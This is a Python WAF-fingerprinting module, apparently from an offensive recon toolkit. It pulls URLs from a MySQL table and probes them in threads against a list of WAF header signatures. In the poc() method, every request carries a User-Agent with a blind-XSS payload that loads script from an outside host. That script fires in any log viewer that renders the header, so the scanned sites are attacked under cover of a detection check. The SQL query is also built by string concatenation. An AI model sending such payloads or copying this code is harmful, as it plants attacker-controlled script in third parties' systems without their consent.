# 用来爬取网站连接
# 参考(抄袭)链接https://github.com/Threezh1/JSFinder/blob/master/JSFinder.py
from utils.common import *
import threading
from queue import Queue     # 接收域名
import requests
import re
from urllib.parse import urlparse
import pymysql

class WAF(object):
    def __init__(self,file):
        #self.domain = domain
        self.file = file
        self.queue = Queue()
        self.thread_count = thread_count_Waf
        self.result = []


    def run(self,url):
        logger.log('INFOR','开始进行Waf检测!')
        logger.log('INFOR', '请等待')
        db = connet()
        cursor = db.cursor()
        sql = """SELECT * FROM """ + str(url).replace('.', '_')
        try:
            # 执行SQL语句
            cursor.execute(sql)
            # 获取所有记录列表
            results = cursor.fetchall()
            for row in results:
                cunhuo_url = row[1]
                # 打印结果
                if cunhuo_url == '' or cunhuo_url == None:
                    pass
                else:
                    #print(cunhuo_url)
                    self.queue.put(cunhuo_url)  # 从数据中进行查询收集的域名
        except:
            logger.log('ALERT',"Error: unable to fetch data")
        # cursor.execute(sql3)
        db.close()
        threads = []

        for i in range(self.thread_count):
            threads.append(self.WAF_Run(self.queue,self.result, self.thread_count,self.file))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        print_try("WAF测完成,发现" + str(len(list(set(self.result)))) + "个URL")
        Baocun_WAF_url(url, list(set(self.result)))
        self.result.clear()
        return list(set(self.result))


    class WAF_Run(threading.Thread):
        def __init__(self, queue, result, thread_count,file):
            self.file = file
            threading.Thread.__init__(self)
            self.queue = queue
            self.result = result
            self.thread_count = thread_count


        def identify(self,header, html):
            mark_list = []
            dna = '''WAF:Topsec-Waf|index|index|<META NAME="Copyright" CONTENT="Topsec Network Security Technology Co.,Ltd"/>|<META NAME="DESCRIPTION" CONTENT="Topsec web UI"/>
                                    WAF:360|headers|X-Powered-By-360wzb|wangzhan\.360\.cn
                                    WAF:360|url|/wzws-waf-cgi/|360wzws
                                    WAF:Anquanbao|headers|X-Powered-By-Anquanbao|MISS
                                    WAF:Anquanbao|url|/aqb_cc/error/|ASERVER
                                    WAF:BaiduYunjiasu|headers|Server|yunjiasu-nginx
                                    WAF:BigIP|headers|Server|BigIP|BIGipServer
                                    WAF:BigIP|headers|Set-Cookie|BigIP|BIGipServer
                                    WAF:BinarySEC|headers|x-binarysec-cache|fill|miss
                                    WAF:BinarySEC|headers|x-binarysec-via|binarysec\.com
                                    WAF:BlockDoS|headers|Server|BlockDos\.net
                                    WAF:CloudFlare|headers|Server|cloudflare-nginx
                                    WAF:Cloudfront|headers|Server|cloudfront
                                    WAF:Cloudfront|headers|X-Cache|cloudfront
                                    WAF:Comodo|headers|Server|Protected by COMODO
                                    WAF:IBM-DataPower|headers|X-Backside-Transport|\A(OK|FAIL)
                                    WAF:DenyAll|headers|Set-Cookie|\Asessioncookie=
                                    WAF:dotDefender|headers|X-dotDefender-denied|1
                                    WAF:Incapsula|headers|X-CDN|Incapsula
                                    WAF:Jiasule|headers|Set-Cookie|jsluid=
                                    WAF:KSYUN|headers|Server|KSYUN ELB
                                    WAF:KONA|headers|Server|AkamaiGHost
                                    WAF:ModSecurity|headers|Server|Mod_Security|NOYB
                                    WAF:NetContinuum|headers|Cneonction|\Aclose
                                    WAF:NetContinuum|headers|nnCoection|\Aclose
                                    WAF:NetContinuum|headers|Set-Cookie|citrix_ns_id
                                    WAF:Newdefend|headers|Server|newdefend
                                    WAF:NSFOCUS|headers|Server|NSFocus
                                    WAF:Safe3|headers|X-Powered-By|Safe3WAF
                                    WAF:Safe3|headers|Server|Safe3 Web Firewall
                                    WAF:Safedog|headers|X-Powered-By|WAF/2\.0
                                    WAF:Safedog|headers|Server|Safedog
                                    WAF:Safedog|headers|Set-Cookie|Safedog
                                    WAF:SonicWALL|headers|Server|SonicWALL
                                    WAF:Stingray|headers|Set-Cookie|\AX-Mapping-
                                    WAF:Sucuri|headers|Server|Sucuri/Cloudproxy
                                    WAF:Usp-Sec|headers|Server|Secure Entry Server
                                    WAF:Varnish|headers|X-Varnish|.*?
                                    WAF:Varnish|headers|Server|varnish
                                    WAF:Wallarm|headers|Server|nginx-wallarm
                                    WAF:WebKnight|headers|Server|WebKnight
                                    WAF:Yundun|headers|Server|YUNDUN
                                    WAF:Yundun|headers|X-Cache|YUNDUN
                                    WAF:Yunsuo|headers|Set-Cookie|yunsuo
                                    '''
            marks = dna.strip().splitlines()
            for mark in marks:
                name, location, key, value = mark.strip().split("|", 3)
                mark_list.append([name, location, key, value])

            for mark_info in mark_list:
                name, location, key, reg = mark_info
                if location == "headers":
                    if key in header and re.search(reg, header[key], re.I):
                        # print(name)
                        return False
                if location == "index":
                    if re.search(reg, html, re.I):
                        # print(name)
                        return False

            return True

        def poc(self,url):
            try:
                header = dict()
                header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
                header["Referer"] = url
                r = requests.get(url, headers=header, timeout=5)
                if r.status_code == 200:
                    f = self.identify(r.headers, r.text)
                    if f:
                        parse = urlparse(r.url)
                        new_url = "%s://%s/" % (parse.scheme, parse.netloc)
                        #logger.log('INFOR',new_url)
                        self.result.append(new_url)
                        return new_url
                    else:
                        return False
                else:
                    return False
            except Exception as e:
                logger.log('ALERT',e)


        def run(self):
            #print('请等待！')
            while not self.queue.empty():
                self.url = self.queue.get_nowait()
                try:
                    self.poc(self.url)
                except Exception as e:
                    logger.log('ALERT',e)
            #print("最后的url:"+content_url)